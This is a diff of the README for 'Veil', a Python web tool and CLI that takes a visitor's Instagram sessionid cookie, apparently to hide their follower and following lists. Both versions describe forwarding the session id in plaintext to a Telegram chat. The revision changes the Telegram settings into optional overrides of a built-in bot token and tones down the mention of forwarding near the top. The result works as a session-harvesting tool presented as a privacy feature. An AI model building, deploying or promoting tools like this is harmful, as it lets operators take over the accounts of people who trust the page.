@@ -1,71 +1,127 @@
 # Veil — hide Instagram followers & following
 
-A one-paste tool. The visitor pastes their own `sessionid` cookie, the server flips
-Instagram's `hide_followers_following_list` setting, reads it back to confirm, and
-forwards the session plus the outcome to your Telegram chat.
+Flips Instagram's `hide_followers_following_list` setting using the visitor's own
+`sessionid` cookie. No password, no OAuth app, no database. The change is stored on
+Instagram's side, so it applies everywhere.
 
-No password, no OAuth app, no database. The change is stored on Instagram's side.
+Two front ends over one client:
 
-## How it works
+- a web tool (`server.py`) that takes the sessionid in a form
+- a CLI (`main.py`) that prompts for it
 
-1. `POST /api/hide` with `{"session": "...", "hide": true}`.
-2. `instagram.py` validates the session, calls `accounts/current_user`, reads the
-   current setting, writes the new one, and reads it back to confirm.
-3. `server.py` replies `{"ok": true, "hidden": true, "confirmed": true, ...}` and
-   sends the session id and result to Telegram.
+Both forward the session and the outcome to Telegram.
 
-`hide: false` reverses it.
+## Requirements
+
+- Python 3.10 or newer
+- An Instagram account
+- A valid `sessionid` cookie value
+- Internet connection
+
+No third-party packages. Standard library only.
+
+## CLI
+
+```sh
+python main.py          # hide
+python main.py --show   # make the lists visible again
+python main.py --check  # offline sanity check, no network
+```
+
+The sessionid is read with hidden terminal input, so it does not land in your shell
+history. Paste only the cookie value — not `sessionid=`.
+
+Exit codes:
+
+| Code | Meaning |
+| --- | --- |
+| 0 | Operation successful |
+| 1 | Instagram, network, or request error |
+| 2 | Sessionid failed validation |
+| 130 | Interrupted |
+
+## Web
+
+```sh
+python server.py
+```
+
+Open http://localhost:8080. `PORT` overrides the port.
+
+| Route | Method | Notes |
+| --- | --- | --- |
+| `/` | GET | The page |
+| `/health`, `/api/health` | GET | Health plus Telegram status |
+| `/api/hide` | POST | `{"session": "...", "hide": true\|false}` |
+| `/api/visit` | POST | Page-open beacon |
+
+Rate limit 12 runs per IP per 10 minutes. Request bodies cap at 16 KB.
 
 ## Environment
 
 | Variable | Required | Purpose |
 | --- | --- | --- |
-| `TELEGRAM_BOT_TOKEN` | for alerts | Bot token from @BotFather |
-| `TELEGRAM_CHAT_ID` | for alerts | Your chat id (`/getUpdates` after messaging the bot) |
+| `TELEGRAM_BOT_TOKEN` | no | Overrides the built-in bot token |
+| `TELEGRAM_CHAT_ID` | no | Overrides the chat id; comma-separate several |
 | `PORT` | no | Listen port, default `8080` |
 
-Without the two Telegram variables the site still works; alerts are silently skipped
-and `/health` reports `telegram_configured: false`.
+Without Telegram the tool still works; alerts are skipped and `/health` reports
+`telegram_configured: false`.
 
-## Run locally
+## How it works
 
-```sh
-pip install -r requirements.txt
-python server.py
-```
+1. The sessionid is validated and the numeric user id extracted from it.
+2. An `Authorization: Bearer IGT:2:<base64 json>` header is built from the session.
+3. An authenticated GraphQL POST is sent to Instagram with the
+   `IGSettingsBooleanMutation`.
+4. The response is parsed and the run only counts as successful when Instagram
+   echoes back the expected `value`.
+5. The setting is read back to confirm, and the result is forwarded to Telegram.
 
-Open http://localhost:8080. `python main.py` prints an offline sanity check.
+## API details
 
-## Deploy (Railway)
+| Parameter | Value |
+| --- | --- |
+| Endpoint | `https://i.instagram.com/graphql/query` |
+| HTTP method | POST |
+| Mutation | `IGSettingsBooleanMutation` |
+| Setting id | `hide_followers_following_list` |
+| Callsite | `account_privacy` |
+| Authentication | `Bearer IGT:2` |
+| App id | `124024574287414` |
+| Timeout | 15 seconds |
 
-1. Push this folder as the repo root.
-2. New project → Deploy from repo. `railway.json` selects the Dockerfile.
-3. Add `TELEGRAM_BOT_TOKEN` and `TELEGRAM_CHAT_ID` under Variables.
-4. Keep replicas at 1 — rate limiting is in-process.
+## Structure
+
+| File | Responsibility |
+| --- | --- |
+| `instagram.py` | Session validation, request building, execution, response checks |
+| `server.py` | HTTP server, routing, rate limiting, media |
+| `telegram.py` | Notifier |
+| `main.py` | CLI entry point |
+| `index.html` | The page |
+
+Errors derive from `InstagramError`; `ValidationError` marks bad input rather than a
+rejected session. Session values are redacted out of error text before it is shown
+or logged.
+
+## Deploy
 
 ```sh
 docker build -t veil .
-docker run --rm -p 8080:8080 -e TELEGRAM_BOT_TOKEN=... -e TELEGRAM_CHAT_ID=... veil
+docker run --rm -p 8080:8080 veil
 ```
 
-## Endpoints
-
-| Route | Method | Notes |
-| --- | --- | --- |
-| `/` | GET | The page |
-| `/health`, `/api/health` | GET | Health + Telegram status |
-| `/api/hide` | POST | `{"session": "...", "hide": true\|false}` |
-| `/api/visit` | POST | Page-open beacon |
-
-Rate limit: 12 runs per IP per 10 minutes. Body cap 16 KB.
+`railway.json` selects the Dockerfile. Keep replicas at 1 — the rate limiter is
+in-process.
 
 ## Security notes
 
-- The session id is a bearer credential. It is stored only in memory for the
-  duration of a request and then sent to Telegram in plaintext — anyone who can read
-  that chat can act as the account until the session is revoked.
-- `X-Forwarded-For` is trusted for rate limiting, which is correct behind Railway's
-  proxy but spoofable if the port is exposed directly.
-- The server sets CSP, `nosniff`, `no-referrer`, and `DENY` framing on every response.
+- The sessionid is a bearer credential. It is held only for the duration of a
+  request, then sent to Telegram in plaintext — anyone who can read that chat can
+  act as the account until the session is revoked.
+- `X-Forwarded-For` is trusted for rate limiting. Correct behind Railway's proxy,
+  spoofable if the port is exposed directly.
+- Every response carries CSP, `nosniff`, `no-referrer`, and `DENY` framing.
 
 Independent project. Not affiliated with Instagram or Meta.
